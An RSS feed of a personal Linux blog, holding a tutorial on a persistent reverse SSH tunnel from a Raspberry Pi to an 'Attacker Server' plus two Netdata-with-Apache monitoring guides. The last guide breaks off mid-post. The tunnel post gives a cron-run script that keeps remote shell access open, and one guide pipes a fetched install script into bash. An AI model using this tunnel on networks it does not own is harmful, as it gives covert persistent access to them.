<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Carlo Alberto Scola</title>
    <description>My Personal Blog</description>
    <link>https://bestrocker221.github.io//</link>
    <atom:link href="https://bestrocker221.github.io//feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 14 Mar 2018 17:26:13 +0100</pubDate>
    <lastBuildDate>Wed, 14 Mar 2018 17:26:13 +0100</lastBuildDate>
    <generator>Jekyll v3.4.3</generator>
    
      <item>
        <title>SSH Reverse Tunnel - Raspberry Pi</title>
        <description>&lt;h1 id=&quot;persistent-reverse-ssh-tunnel&quot;&gt;Persistent Reverse-SSH Tunnel&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/ssh-tunnel.png&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites:&lt;/h2&gt;
&lt;p&gt;Example:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;user &lt;em&gt;pi&lt;/em&gt; on the Raspberry.&lt;/li&gt;
  &lt;li&gt;user &lt;em&gt;lobs&lt;/em&gt; on the Attacker Server.&lt;/li&gt;
  &lt;li&gt;SSH server running on both.
    &lt;h2 id=&quot;from-the-raspberry&quot;&gt;From the Raspberry:&lt;/h2&gt;
  &lt;/li&gt;
  &lt;li&gt;Copy the RSA key to the Server with:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;ssh-copy-id -i .ssh/id_rsa.pub lobs@AttackerServer.domain&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If id_rsa.pub doesn’t already exists then:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;ssh-keygen&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;The command to launch is:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;ssh -p 30022 -N -R 2222:localhost:22 pi@AttackerServer.domain&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This will ssh the Raspberry to the Attacker Server without specifying any command (-N) and tell the server to redirect ssh connection from local (server) port 2222 to remote (raspberry) port 22 (or whatever you want).&lt;/p&gt;

&lt;p&gt;After that, on the Attacker Server there will be a ssh socket listening on port 2222 ready to redirect ssh traffic to Raspberry through port 22.&lt;/p&gt;

&lt;p&gt;You can always set up the raspberry to serve ssh connections on port 80 or 443 in order to avoid firewall issues. It depends on the firewall configurations.&lt;/p&gt;

&lt;h2 id=&quot;the-attacker&quot;&gt;The Attacker&lt;/h2&gt;

&lt;p&gt;The attacker just need to:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;SSH into his server on port 30022.&lt;/li&gt;
  &lt;li&gt;Run the command:&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;ssh -p 2222 -l lobs localhost&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;automation-and-persistence&quot;&gt;&lt;strong&gt;Automation and Persistence&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;A script can be put in the crontab to check periodically for connection to a remote server.&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;https://github.com/bestrocker221/serverstuff/blob/master/new_ssh_reverse_tunnel.sh&quot;&gt;new_ssh_reverse_tunnel.sh&lt;/a&gt; is also available in my GitHub account.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
createTunnel&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  /usr/bin/ssh -N -R 2222:localhost:22 pi@AttackerServer.domain
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -eq 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Tunnel created successfully
  &lt;span class=&quot;k&quot;&gt;else
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;An error occurred creating a tunnel. ReturnCode is &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
/bin/pidof ssh
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -ne 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;; &lt;span class=&quot;k&quot;&gt;then
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Creating new tunnel ...
  createTunnel
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Copy the script &lt;strong&gt;new_ssh_tunnel.sh&lt;/strong&gt; in the &lt;em&gt;/etc/cron.d/&lt;/em&gt; folder.&lt;/p&gt;

&lt;p&gt;To edit the crontab run: &lt;strong&gt;(Do not edit the crontab file directly)&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;crontab -e&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And add at the end:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nano&quot; data-lang=&quot;nano&quot;&gt;*/5 * * * * /etc/cron.d/new_ssh_tunnel.sh 2&amp;gt; /dev/null&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Every 5 minutes it will check for the tunnel to create.&lt;/p&gt;

&lt;h3 id=&quot;considerations&quot;&gt;&lt;strong&gt;Considerations&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;This way if the Raspberry falls under someone’s else hands it has full access on the AttackerServer. If it has served its aim then you should remove the rsa key from the authorized_key on the server.&lt;/p&gt;
</description>
        <pubDate>Tue, 13 Mar 2018 00:00:00 +0100</pubDate>
        <link>https://bestrocker221.github.io//linux/security/2018/03/13/ssh-reverse-tunnel.html</link>
        <guid isPermaLink="true">https://bestrocker221.github.io//linux/security/2018/03/13/ssh-reverse-tunnel.html</guid>
        
        
        <category>linux</category>
        
        <category>security</category>
        
      </item>
    
      <item>
        <title>Netdata cluster - Monitoring multiple server.</title>
        <description>&lt;h1 id=&quot;one-dashboard-multiple-server-monitoring&quot;&gt;One Dashboard, multiple server monitoring.&lt;/h1&gt;

&lt;h2 id=&quot;password-protected-useful-dashboard&quot;&gt;Password protected useful dashboard.&lt;/h2&gt;

&lt;h3 id=&quot;aggregate-multiple-server-netdata-logs-into-one-protected-page&quot;&gt;Aggregate multiple server netdata logs into one protected page.&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/netdata-tv.jpg&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;what-do-we-want&quot;&gt;&lt;strong&gt;What do we want?&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;The aim of this tutorial is to allow the monitoring of multiple Linux server through one single and password protected dashboard. It is possible to add as many server and graph as you want.&lt;/p&gt;

&lt;p&gt;I’m going to describe a use-case where you are using a free dynamic DNS service like &lt;a href=&quot;https://www.noip.com&quot;&gt;no-ip&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;netdata-dashboard&quot;&gt;Netdata Dashboard&lt;/h2&gt;

&lt;p&gt;We want each server to serve netdata webpage on &lt;em&gt;/netdata/&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;We need to choose a server which will host the netdata dashboard.&lt;/p&gt;

&lt;p&gt;Remember: every web server must be configured to use SSL/TLS in order to work.&lt;/p&gt;

&lt;p&gt;Example: We have:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Raspberry Pi with &lt;em&gt;domain *myraspi.com&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Server 1 with domain &lt;em&gt;srv1.com&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Server 2 with domain &lt;em&gt;srv2.com&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;…&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We want:&lt;/p&gt;

&lt;dl&gt;
  &lt;dt&gt;Raspberry Pi (netdata collector)&lt;/dt&gt;
  &lt;dd&gt;&lt;em&gt;myraspi.com/netdata/&lt;/em&gt; (permit only to myraspi.com)&lt;/dd&gt;
  &lt;dd&gt;&lt;em&gt;myraspi.com/netdata-cluster/dashboard.html&lt;/em&gt; (password protected)&lt;/dd&gt;
  &lt;dt&gt;Server1&lt;/dt&gt;
  &lt;dd&gt;&lt;em&gt;srv1.com/netdata/&lt;/em&gt; (permit only to myraspi.com)&lt;/dd&gt;
  &lt;dt&gt;Server2&lt;/dt&gt;
  &lt;dd&gt;&lt;em&gt;srv2.com/netdata/&lt;/em&gt; (permit only to myraspi.com)&lt;/dd&gt;
&lt;/dl&gt;

&lt;h3 id=&quot;netdata-installation&quot;&gt;&lt;strong&gt;Netdata installation&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;We need to install netdata on each one the same way, and then decide which one will host the dashboard. In my case i used the Raspberry Pi.&lt;/p&gt;

&lt;p&gt;For this you can have a quick look at “Installation” section in &lt;a href=&quot;/linux/web/2018/02/15/netdata-ubuntu.html&quot;&gt;Setting Netdata server monitoring with password authentication on Apache proxy.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I assume you have already enabled HTTPS in each server, in case you have to do it. You can find here all the instructions &lt;a href=&quot;/linux/web/2018/02/15/apache-ssl-tls-domain.html&quot;&gt;Configuring a new SSL/TLS domain on Apache2&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;apache-configuration&quot;&gt;Apache configuration&lt;/h3&gt;

&lt;p&gt;Create a directory on the raspi which will contain the dashboard.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo mkdir /var/www/netdata-cluster&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt; We first need to install some modules for Apache: &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo apt install libxml2-dev libapache2-mod-proxy-html&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt; Then we need to activate the mods: &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo a2enmod proxy
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo a2enmod proxy_html
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo a2enmod proxy_http
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo a2enmod xml2enc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Open the default &lt;em&gt;vhost&lt;/em&gt; file for the HTTPS domain and add these lines at the end right before the enclosing VirtualHost tag.&lt;/p&gt;

&lt;p&gt;In my case the config file is &lt;em&gt;/etc/apache2/sites-available/default-ssl.conf&lt;/em&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;        RewriteEngine On
        ProxyRequests Off
        ProxyPreserveHost on

        &amp;lt;location /netdata/ &amp;gt;
               Require host &amp;lt;YOUR DASHBOARD HOSTING DOMAIN&amp;gt;  //e.g. myraspi.com
        &amp;lt;/location&amp;gt;

       &amp;lt;proxy&amp;gt;
            Order allow,deny
            Allow from all
       &amp;lt;/proxy&amp;gt;
       &amp;lt;location /netdata-cluster/&amp;gt;
                AuthType Basic
                AuthName &lt;span class=&quot;s2&quot;&gt;&quot;Restricted Content&quot;&lt;/span&gt;
                AuthUserFile /etc/apache2/.htpasswd
                Require valid-user
                Order deny,allow
                Allow from all
        &amp;lt;/location&amp;gt;
        &amp;lt;Directory /netdata/ &amp;gt;
                Options -Indexes +FollowSymLinks
                AllowOverride all
                Order deny,allow
                Deny from all
       &amp;lt;/Directory&amp;gt;

        ProxyPass &lt;span class=&quot;s2&quot;&gt;&quot;/netdata/&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1:19999/&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;connectiontimeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;nv&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30
        ProxyPassReverse &lt;span class=&quot;s2&quot;&gt;&quot;/netdata/&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1:19999/&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Verify the sintax is correct with:  (should return &lt;em&gt;Syntax OK&lt;/em&gt;)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;apachectl configtest&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we are going to create the credentials for accessing the dashboard page&lt;/p&gt;

&lt;p&gt;Install apache2-utils if you don’t have already and create a netdata user&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo apt install apache2-utils
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo htpasswd -c /etc/apache2/.htpasswd netdata&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;You have to insert the password for the user ‘netdata’ twice.&lt;/p&gt;

&lt;p&gt;And restart apache.&lt;/p&gt;

&lt;h3 id=&quot;netdata-dashboard-1&quot;&gt;&lt;strong&gt;Netdata Dashboard&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;Create a file into &lt;em&gt;/var/www/netdata-cluster/dashboard.html&lt;/em&gt;, this will be your netdata collector.&lt;/p&gt;

&lt;p&gt;Here is an example provided by Netdata &lt;a href=&quot;https://github.com/firehol/netdata/blob/master/web/tv.html&quot;&gt;tv.html&lt;/a&gt;. You can copy it into your dashboard.html.
It provide a simple example with some graph in comparison from 2 different server. We are going to load data from &lt;em&gt;myraspi&lt;/em&gt;.com and &lt;em&gt;srv1.com&lt;/em&gt;. You can add as many as you want.&lt;/p&gt;

&lt;h4 id=&quot;configuring-dashboard-to-get-data-from-servers&quot;&gt;&lt;strong&gt;Configuring dashboard to get data from servers&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Very simple.&lt;/p&gt;

&lt;p&gt;In &lt;em&gt;dashboard.html&lt;/em&gt; the first thing to do is to load a dashboard Javascript file located in the Netdata collector (raspi).&lt;/p&gt;

&lt;p&gt;Modify near row 52 the  html script tag … to:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://myraspi.com/netdata/dashboard.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The rest of the file include two graph for every row in which if you don’t specify the &lt;strong&gt;data-host&lt;/strong&gt; value, netdata will set the default one (myraspi).&lt;/p&gt;

&lt;p&gt;Every graph starts with e.g&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-netdata=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;system.io&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;where &lt;em&gt;system.io&lt;/em&gt; is the identification name of the graph.&lt;/p&gt;

&lt;p&gt;All you need to do is to add/modify the line below:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;data-host=&quot;http://registry.my-netdata.io&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;data-host=&quot;https://srv1.com/netdata/&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;for every graph (1 per row) in the file.&lt;/p&gt;

&lt;p&gt;Results!&lt;/p&gt;
&lt;figure&gt;
&lt;img src=&quot;/assets/netdata-tv2.jpg&quot; alt=&quot;cropped screen view of netdata dashboard&quot; /&gt;
&lt;figcaption align=&quot;center&quot;&gt;Left is srv1.com and right is myraspi.com&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h3 id=&quot;security&quot;&gt;&lt;strong&gt;Security&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;For now we have made all traffic go through HTTPS and made the dashboard page password protected.. but&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Access to page &lt;em&gt;/netdata/&lt;/em&gt; is protected by Apache require host directive, but the IP/domain reverse lookup need to be addressed.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This because for some access restriction Apache will need to do a reverse lookup to check for the IP to hostname match and viceversa.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;This configuration will cause Apache to perform a double reverse DNS lookup on the client IP address, regardless of the setting of the HostnameLookups directive. It will do a reverse DNS lookup on the IP address to find the associated hostname, and then do a forward lookup on the hostname to assure that it matches the original IP address. Only if the forward and reverse DNS are consistent and the hostname matches will access be allowed.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://httpd.apache.org/docs/2.4/mod/mod_authz_host.html&quot;&gt;https://httpd.apache.org/docs/2.4/mod/mod_authz_host.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The only way to allow Apache Require directive to work properly is to maintain updated an entry in the hosts file. We need to do this because free dynamic dns service does not provide a DNS PTR record so reverse lookup will always fail and apache will not be able to use its directives to protect the &lt;em&gt;/netdata/&lt;/em&gt; folder path.&lt;/p&gt;

&lt;p&gt;Here is the script &lt;a href=&quot;https://github.com/bestrocker221/serverstuff/blob/master/update-hosts.sh&quot;&gt;update-hosts.sh&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Open the file and edit the field DOMAIN to:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;DOMAIN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;myraspi.com&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;You need to copy it into your /etc/cron.d folder and then setup a hourly cron job: (as root user)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;crontab -e&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now add at the end of the file:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;@hourly root /etc/cron.d/update_iptables_domain_rule.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now the script will automatically refresh the hosts file so that you don’t have to worry about the dynamic IP changes.&lt;/p&gt;

&lt;p&gt;This way only the traffic from (-s) &lt;em&gt;myraspi.com&lt;/em&gt; will be allowed to access /netdata/ folder.&lt;/p&gt;
</description>
        <pubDate>Sun, 18 Feb 2018 00:00:00 +0100</pubDate>
        <link>https://bestrocker221.github.io//linux/web/2018/02/18/netdata-cluster.html</link>
        <guid isPermaLink="true">https://bestrocker221.github.io//linux/web/2018/02/18/netdata-cluster.html</guid>
        
        
        <category>linux</category>
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>Configuring Netdata on Ubuntu + apache proxy + authentication</title>
        <description>&lt;h1&gt; Setting Netdata server monitoring with password authentication on Apache proxy.&lt;/h1&gt;

&lt;h2&gt;Password protected server monitoring.&lt;/h2&gt;

&lt;h3&gt; Netdata, a beautiful, lightweight, monitoring tool.&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/netdata1.jpg&quot; /&gt;&lt;/p&gt;

&lt;h3&gt;&lt;strong&gt;What do we want?&lt;/strong&gt; &lt;/h3&gt;

&lt;p&gt; The aim of this tutorial is to allow the monitoring of a Linux server through apache not using other ports than 80/443 (443 is used here) in a way that the local 127.0.0.1:19999 will be accessible only from www.example.com/netdata previous authentication.


&lt;h3&gt;&lt;strong&gt;Netdata installation&lt;/strong&gt; &lt;/h3&gt;
&lt;p&gt; The first thing needed is netdata installed on the server.&lt;br /&gt; &lt;/p&gt;

&lt;p&gt;
    To do so you can either run:


&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# bash &amp;lt;(curl -Ss https://my-netdata.io/kickstart.sh) &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;


and let the automatic installer do the work for you &lt;br /&gt;

 or you can visit &lt;a href=&quot;https://github.com/firehol/netdata/wiki/Installation&quot;&gt; Netdata Github installer page &lt;/a&gt; for other instructions and details.
&lt;/p&gt;

&lt;p&gt;
    Once you have done you should have an output like this. &lt;br /&gt;

    &lt;img src=&quot;/assets/netdata2.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt; Now you should be able to see the netdata page on the http:/IP:19999 &lt;p&gt;

&lt;p&gt; If the server is under iptables protection you need to add a rule for INPUT packets:


&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#sudo iptables -A INPUT -p tcp --dport 19999 -j ACCEPT&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;


NOTE: you won't need this if you are going to proxy data throug normal 80/443 port. You can skip this or you can use to test the right functioning of netdata.
&lt;/p&gt;

&lt;h3&gt;&lt;strong&gt;Apache configuration&lt;/strong&gt; &lt;/h3&gt;

&lt;p&gt;We need to create a new Virtual Host which will proxy all the requests coming to a specified external URL through our netdata local page.&lt;/p&gt;

&lt;p&gt; We first need to install some modules for Apache: &lt;/p&gt;


&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#sudo apt install libxml2-dev libapache2-mod-proxy-html&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;


&lt;p&gt; Then we need to activate some mods: &lt;/p&gt;


&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#sudo a2enmod proxy&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#sudo a2enmod proxy_html&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#sudo a2enmod proxy_http&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#sudo a2enmod xml2enc&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;


&lt;p&gt; If you already have a vhost with your www.example.com and SSL configuration use that (in my case is default-ssl.conf) located in /etc/apache2/sites-available/ &lt;p&gt;

&lt;p&gt; You will have something starting similar to this &lt;/p&gt;


&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;IfModule mod_ssl.c&amp;gt;
        &amp;lt;VirtualHost _default_:443&amp;gt;
                ServerAdmin webmaster@localhost
                ServerName bestrockers.ddns.net

                DocumentRoot /var/www

                SSLEngine on

                ....
                ....&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;


&lt;p&gt; Just add at the end these lines right before the end of VirtualHost tag &lt;/p&gt;


&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;            RewriteEngine on
            ProxyRequests Off
            &amp;lt;proxy&amp;gt;
                Order deny,allow
                Allow from all
            &amp;lt;/proxy&amp;gt;

            ProxyPass &lt;span class=&quot;s2&quot;&gt;&quot;/netdata/&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://netdata-ip:19999/&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;connectiontimeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;nv&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30
            ProxyPassReverse &lt;span class=&quot;s2&quot;&gt;&quot;/netdata/&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://netdata-ip:19999/&quot;&lt;/span&gt;

            &amp;lt;location /netdata/&amp;gt;
                AuthType Basic
                AuthName &lt;span class=&quot;s2&quot;&gt;&quot;Restricted Content&quot;&lt;/span&gt;
                AuthUserFile /etc/apache2/.htpasswd
                Require valid-user
                Order deny,allow
                Allow from all
            &amp;lt;/location&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;


&lt;p&gt; And create the directory /var/www/netdata (as is your config). &lt;/p&gt;

&lt;p&gt;NOTE: if you don't have a vhost configured for SSL/TLS for your domain go &lt;a href=&quot;/linux/web/2018/02/15/apache-ssl-tls-domain.html&quot;&gt; here&lt;/a&gt; for a quick guide.&lt;/p&gt;

&lt;p&gt; Now we are going to create the credentials for accessing the html page &lt;/p&gt;

&lt;p&gt;Install apache2-utils if you don't have already and create a netdata user&lt;/p&gt;


&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#sudo apt install apache2-utils&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#sudo htpasswd -c /etc/apache2/.htpasswd netdata&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;


&lt;p&gt; You have to insert the password for the user 'netdata' twice. &lt;/p&gt;

&lt;p&gt;Finally restart apache2&lt;/p&gt;


&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#sudo systemctl restart apache2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;


&lt;p&gt; Add a rule to block netdata on port 19999 &lt;/p&gt;


